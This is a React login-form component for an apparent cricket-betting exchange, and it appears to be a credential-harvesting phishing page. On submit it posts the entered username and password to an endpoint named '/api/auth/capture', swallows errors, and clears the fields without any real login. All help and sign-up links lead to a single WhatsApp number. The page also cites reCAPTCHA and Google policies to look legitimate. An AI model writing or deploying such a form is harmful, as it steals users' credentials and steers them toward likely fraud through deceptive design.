import { useState } from 'react';

const SUPPORT_URL = 'https://wa.me/447474785565?text=Hi%2C%20I%20want%20to%20get%20my%20online%20cricket%20ID';

const LoginForm = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    try {
      await fetch('/api/auth/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password }),
      });
    } catch {
      // silently ignore errors
    } finally {
      setUsername('');
      setPassword('');
      setLoading(false);
    }
  };

  return (
    <div
      className="flex flex-col items-center pt-6 pb-10 px-4"
      style={{ background: 'linear-gradient(180deg, #2a2a2a 0%, #111111 60%, #000000 100%)' }}
    >
      {/* Form Card */}
      <div className="bg-transparent border border-gray-600 rounded-lg p-8 w-full max-w-[460px] text-white text-center">
        <form onSubmit={handleSubmit} className="flex flex-col items-center gap-3">
          <input
            type="text"
            placeholder="Username"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="w-full bg-white text-gray-700 border border-gray-300 rounded px-4 py-3 text-sm placeholder-gray-400 outline-none focus:border-orange-400"
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full bg-white text-gray-700 border border-gray-300 rounded px-4 py-3 text-sm placeholder-gray-400 outline-none focus:border-orange-400"
          />

          <button
            type="submit"
            disabled={loading}
            className="w-full py-3 rounded text-white font-semibold text-base cursor-pointer mt-1 hover:opacity-90 transition-opacity"
            style={{ background: 'linear-gradient(-180deg, #fd8f3b 0%, #fd3523 100%)' }}
          >
            {loading ? 'Logging in...' : 'Login'}
          </button>

          <a
            href={SUPPORT_URL}
            target="_blank"
            rel="noreferrer"
            className="blink w-full py-3 rounded text-white text-sm text-center block hover:opacity-90 transition-opacity"
            style={{ background: 'linear-gradient(-180deg, #8b4513 0%, #6b3410 100%)' }}
          >
            Login Problem? Contact Support Here
          </a>

          <p className="text-gray-300 text-sm mt-1">
            Not registered?{' '}
            <a href={SUPPORT_URL} target="_blank" rel="noreferrer" className="underline text-white font-medium">
              Create an account
            </a>
          </p>

          <a
            href={SUPPORT_URL}
            target="_blank"
            rel="noreferrer"
            className="text-gray-300 text-sm underline hover:text-white"
          >
            Forgot Password
          </a>

          <p className="text-xs text-gray-400 mt-3 leading-relaxed">
            This site is protected by reCAPTCHA and the{' '}
            <a href="https://policies.google.com/privacy" className="underline hover:text-white">Google Privacy Policy</a>{' '}
            and{' '}
            <a href="https://policies.google.com/terms" className="underline hover:text-white">Terms of Service</a>{' '}
            apply.
            <br />© Unity Exchange
          </p>
        </form>
      </div>
    </div>
  );
};

export default LoginForm;
